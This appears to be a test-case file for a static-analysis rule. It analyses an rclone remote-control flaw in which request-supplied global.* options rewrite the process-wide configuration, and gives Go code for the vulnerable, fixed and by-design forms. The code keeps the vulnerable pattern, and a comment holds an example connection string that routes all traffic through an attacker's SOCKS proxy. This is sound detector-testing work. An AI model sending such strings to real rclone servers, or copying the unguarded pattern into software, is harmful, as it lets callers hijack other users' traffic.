# Rank 1654 / CVE-2026-49980 (GHSA-qw24-gh76-8rvv): rclone's remote-control
# interface accepted connection strings carrying global.* options, and
# fs.NewFs -> addConfigToContext (fs/newfs.go) applied every global.<name>
# key from a request-derived connection string to the process-wide config
# via configstruct.Set(globalConfig, GetConfig(context.Background())). Any
# rc caller therefore rewrote rclone's process-wide configuration --
# global.http_proxy is the advisory's example -- for every other user and
# connection of the same process. The advisory records CWE-306
# (unauthenticated command execution via inline remote instantiation);
# this commit is its second fix: the parent 48da177 closed unauthenticated
# inline-remote instantiation on the --rc-serve path (checkServeRemote
# rejects global.* keys there), and 9222ed2 closes the
# process-wide mutation on every rc path by marking the context at the rc
# boundaries (fs.WithRCRequest at rcserver.serveRemote's cache.Get and at
# jobs.NewJob) and guarding the write with !IsRCRequest(ctx), with the
# marker reapplied in fs.CopyConfig.
#
# The pool row's `nocommit` flag is wrong: the commit resolves in a
# default clone and `git show` reads the change in full (it is the v1.75.0
# backport of mainline 53f972830c). The remediation is present at <fix>
# and absent at <fix>^, where serveRemote passes s.ctx unmarked, NewJob
# does not mark, and the global write is unconditional. No pool
# correction.
#
# ATTENTION, wiring-not-dataflow family (the 1514/1535/1540/1556/1557/
# 1593 shape, the context-marker-and-guard-in-callee variant). The fix
# changes no dataflow, and that is measured, not assumed: a full-tree
# scan (1108 Go files) reports 691 findings at the patched revision in
# each of three --cache off runs and 691/693/691/691/693 at the parent
# over five more, with the only set differences being VYQL-SEC-001
# secret-to-log rows that surface differently run to run; the two
# VYQL-CFG-014 rows whose sink is the configstruct.Set pair in
# fs/newfs.go are identical modulo the patch's line shift
# (:113/:121 -> :129/:137) and still source from an unrelated imagekit
# API response (backend/imagekit/imagekit.go:529). The review-flag view
# carries no flag at all on fs/rc/rcserver/rcserver.go.
#
# A request-derived source does reach the backend-startup half of the
# write on both revisions: `vyql trace -from code.HttpInput -to
# code.TrustBoundary` over the fs subtree shows the handler's *http.Request
# reaching fs/newfs.go:113 at the parent (r.Context() -> jobs.NewJob ->
# getConfig -> AddConfig -> ci, two sources) and fs/newfs.go:129 at the
# fix (forty-four sources, the path now threading through
# fs.WithRCRequest's own context.WithValue). No source reaches the global
# application line at either revision: its target argument is a fresh
# GetConfig(context.Background()) and its map comes from the connection
# string, which dies in the global./override. prefix switch.
#
# The first two blocks below are a connected pair -- the request
# parameters derive from the request and the Fs cache is a package-level
# call, the way rclone's own fs/cache sits outside the server -- and they
# pin the non-discrimination directly: the same VYQL-CFG-014 row fires at
# the vulnerable and the fixed form (1 == 1, three runs each), the taint
# path visibly passing through WithRCRequest, and both `unless` clauses
# of the rule read "no dominating guard on sink" at the fixed form.
# The guard reads a context value whose provenance was set in a caller,
# and the context channel carries taint but no control: this is the Go
# instance of the cross-procedural neutralising-control family (Rust
# 1364, JavaScript/TypeScript 1372, PHP 1394), distinguished by riding a
# context value rather than a sibling call.
#
# Nothing shippable keys the change. The only tokens the fix adds are its
# own marker pair (fs.WithRCRequest / IsRCRequest), and the 1380
# counterweight does not apply: the guarded function gains no
# API-documented call, only the fix's own predicate. The third block pins
# the by-design form the fix deliberately keeps -- global.* process-wide
# application for command-line remotes -- which no request source can
# reach, so a sink-side binding cannot report the write unconditionally
# either.
#
# verify_current_expected: attention-wiring-not-dataflow. The first block
# expects the row that does fire (on the backend-startup application,
# sourced from the request context the marker rides); the second expects
# the same row at the fixed form and must flip to reject, with the first
# staying expect, once a control can be attributed from a context write
# at the boundary to the guard that reads it.

test "rank1654: rc connection string path reaches the process-wide config"
  lang go
  file rcconfig.go
  expect VYQL-CFG-014
  code
  ```
  package rc

  import (
  	"context"
  	"net/http"
  	"strings"
  )

  type Params map[string]string

  func (p Params) GetString(key string) string { return p[key] }

  // The rc boundary derives the request parameters from the request.
  func readParams(r *http.Request) Params {
  	in := Params{}
  	for k, vs := range r.URL.Query() {
  		if len(vs) > 0 {
  			in[k] = vs[len(vs)-1]
  		}
  	}
  	return in
  }

  type Fs interface{ Name() string }

  // The Fs cache sits outside the server, the way fs/cache does in rclone.
  func CacheGet(ctx context.Context, fsString string) (Fs, error) {
  	return NewFs(ctx, fsString)
  }

  type Server struct{}

  // The rc boundary hands the request context to the Fs cache unmarked.
  func (s *Server) handlePost(w http.ResponseWriter, r *http.Request, path string) {
  	ctx := r.Context()
  	in := readParams(r)
  	fsString := in.GetString("fs")
  	f, err := CacheGet(ctx, fsString)
  	if err != nil {
  		return
  	}
  	_ = f
  }

  // remote,global.http_proxy=socks5://attacker:1080
  func NewFs(ctx context.Context, path string) (Fs, error) {
  	_, config := ConfigFs(path)
  	newCtx, err := addConfigToContext(ctx, config)
  	_ = newCtx
  	return nil, err
  }

  func ConfigFs(path string) (string, map[string]string) {
  	config := map[string]string{}
  	for _, kv := range strings.Split(path, ",") {
  		if i := strings.Index(kv, "="); i > 0 {
  			config[kv[:i]] = kv[i+1:]
  		}
  	}
  	return path, config
  }

  type ConfigInfo struct{ HTTPProxy string }

  func AddConfig(ctx context.Context) (context.Context, *ConfigInfo) { return ctx, &ConfigInfo{} }

  func GetConfig(ctx context.Context) *ConfigInfo { return &ConfigInfo{} }

  type configstructPkg struct{}

  var configstruct = configstructPkg{}

  func (configstructPkg) Set(m map[string]string, ci *ConfigInfo) error {
  	if v, ok := m["http_proxy"]; ok {
  		ci.HTTPProxy = v
  	}
  	return nil
  }

  func addConfigToContext(ctx context.Context, config map[string]string) (context.Context, error) {
  	overrideConfig := map[string]string{}
  	globalConfig := map[string]string{}
  	for k, v := range config {
  		switch {
  		case strings.HasPrefix(k, "global."):
  			overrideConfig[strings.TrimPrefix(k, "global.")] = v
  			globalConfig[strings.TrimPrefix(k, "global.")] = v
  		case strings.HasPrefix(k, "override."):
  			overrideConfig[strings.TrimPrefix(k, "override.")] = v
  		}
  	}
  	if len(overrideConfig) == 0 && len(globalConfig) == 0 {
  		return ctx, nil
  	}
  	newCtx, ci := AddConfig(ctx)
  	if err := configstruct.Set(overrideConfig, ci); err != nil {
  		return ctx, err
  	}
  	// Set the global context only
  	if len(globalConfig) != 0 {
  		globalCI := GetConfig(context.Background())
  		if err := configstruct.Set(globalConfig, globalCI); err != nil {
  			return ctx, err
  		}
  	}
  	return newCtx, nil
  }
  ```

test "rank1654: fix marks the rc request and the same row still reports"
  lang go
  file rcconfig.go
  expect VYQL-CFG-014
  code
  ```
  package rc

  import (
  	"context"
  	"net/http"
  	"strings"
  )

  type Params map[string]string

  func (p Params) GetString(key string) string { return p[key] }

  // The rc boundary derives the request parameters from the request.
  func readParams(r *http.Request) Params {
  	in := Params{}
  	for k, vs := range r.URL.Query() {
  		if len(vs) > 0 {
  			in[k] = vs[len(vs)-1]
  		}
  	}
  	return in
  }

  type Fs interface{ Name() string }

  // The Fs cache sits outside the server, the way fs/cache does in rclone.
  func CacheGet(ctx context.Context, fsString string) (Fs, error) {
  	return NewFs(ctx, fsString)
  }

  type Server struct{}

  func (s *Server) handlePost(w http.ResponseWriter, r *http.Request, path string) {
  	ctx := r.Context()
  	in := readParams(r)
  	fsString := in.GetString("fs")
  	// Mark as an rc request e.g. so NewFs can reject global.* config
  	f, err := CacheGet(WithRCRequest(ctx), fsString)
  	if err != nil {
  		return
  	}
  	_ = f
  }

  // remote,global.http_proxy=socks5://attacker:1080
  func NewFs(ctx context.Context, path string) (Fs, error) {
  	_, config := ConfigFs(path)
  	newCtx, err := addConfigToContext(ctx, config)
  	_ = newCtx
  	return nil, err
  }

  func ConfigFs(path string) (string, map[string]string) {
  	config := map[string]string{}
  	for _, kv := range strings.Split(path, ",") {
  		if i := strings.Index(kv, "="); i > 0 {
  			config[kv[:i]] = kv[i+1:]
  		}
  	}
  	return path, config
  }

  type ConfigInfo struct{ HTTPProxy string }

  func AddConfig(ctx context.Context) (context.Context, *ConfigInfo) { return ctx, &ConfigInfo{} }

  func GetConfig(ctx context.Context) *ConfigInfo { return &ConfigInfo{} }

  // rcRequestKey marks a context as created by a remote control (rc) request.
  type rcRequestKeyType struct{}

  var rcRequestKey = rcRequestKeyType{}

  func WithRCRequest(ctx context.Context) context.Context {
  	return context.WithValue(ctx, rcRequestKey, true)
  }

  func IsRCRequest(ctx context.Context) bool {
  	v, _ := ctx.Value(rcRequestKey).(bool)
  	return v
  }

  type configstructPkg struct{}

  var configstruct = configstructPkg{}

  func (configstructPkg) Set(m map[string]string, ci *ConfigInfo) error {
  	if v, ok := m["http_proxy"]; ok {
  		ci.HTTPProxy = v
  	}
  	return nil
  }

  func addConfigToContext(ctx context.Context, config map[string]string) (context.Context, error) {
  	overrideConfig := map[string]string{}
  	globalConfig := map[string]string{}
  	for k, v := range config {
  		switch {
  		case strings.HasPrefix(k, "global."):
  			overrideConfig[strings.TrimPrefix(k, "global.")] = v
  			globalConfig[strings.TrimPrefix(k, "global.")] = v
  		case strings.HasPrefix(k, "override."):
  			overrideConfig[strings.TrimPrefix(k, "override.")] = v
  		}
  	}
  	if len(overrideConfig) == 0 && len(globalConfig) == 0 {
  		return ctx, nil
  	}
  	newCtx, ci := AddConfig(ctx)
  	if err := configstruct.Set(overrideConfig, ci); err != nil {
  		return ctx, err
  	}
  	// Set the global context unless this Fs is being created for an rc request
  	if len(globalConfig) != 0 && !IsRCRequest(ctx) {
  		globalCI := GetConfig(context.Background())
  		if err := configstruct.Set(globalConfig, globalCI); err != nil {
  			return ctx, err
  		}
  	}
  	return newCtx, nil
  }
  ```

test "rank1654: command-line remotes keep process-wide global.* application by design"
  lang go
  file cmdline.go
  reject VYQL-CFG-014
  code
  ```
  package main

  import (
  	"context"
  	"strings"
  )

  type Fs interface{ Name() string }

  func NewFs(ctx context.Context, path string) (Fs, error) {
  	_, config := ConfigFs(path)
  	newCtx, err := addConfigToContext(ctx, config)
  	_ = newCtx
  	return nil, err
  }

  func ConfigFs(path string) (string, map[string]string) {
  	config := map[string]string{}
  	for _, kv := range strings.Split(path, ",") {
  		if i := strings.Index(kv, "="); i > 0 {
  			config[kv[:i]] = kv[i+1:]
  		}
  	}
  	return path, config
  }

  type ConfigInfo struct{ HTTPProxy string }

  func AddConfig(ctx context.Context) (context.Context, *ConfigInfo) { return ctx, &ConfigInfo{} }

  func GetConfig(ctx context.Context) *ConfigInfo { return &ConfigInfo{} }

  type configstructPkg struct{}

  var configstruct = configstructPkg{}

  func (configstructPkg) Set(m map[string]string, ci *ConfigInfo) error {
  	if v, ok := m["http_proxy"]; ok {
  		ci.HTTPProxy = v
  	}
  	return nil
  }

  func addConfigToContext(ctx context.Context, config map[string]string) (context.Context, error) {
  	overrideConfig := map[string]string{}
  	globalConfig := map[string]string{}
  	for k, v := range config {
  		switch {
  		case strings.HasPrefix(k, "global."):
  			overrideConfig[strings.TrimPrefix(k, "global.")] = v
  			globalConfig[strings.TrimPrefix(k, "global.")] = v
  		case strings.HasPrefix(k, "override."):
  			overrideConfig[strings.TrimPrefix(k, "override.")] = v
  		}
  	}
  	if len(overrideConfig) == 0 && len(globalConfig) == 0 {
  		return ctx, nil
  	}
  	newCtx, ci := AddConfig(ctx)
  	if err := configstruct.Set(overrideConfig, ci); err != nil {
  		return ctx, err
  	}
  	// Set the global context only
  	if len(globalConfig) != 0 {
  		globalCI := GetConfig(context.Background())
  		if err := configstruct.Set(globalConfig, globalCI); err != nil {
  			return ctx, err
  		}
  	}
  	return newCtx, nil
  }

  func main() {
  	// rclone remote,global.http_proxy=socks5://proxy:1080:dir
  	remote := "remote,global.http_proxy=socks5://proxy:1080"
  	f, err := NewFs(context.Background(), remote)
  	if err != nil {
  		return
  	}
  	_ = f
  }
  ```
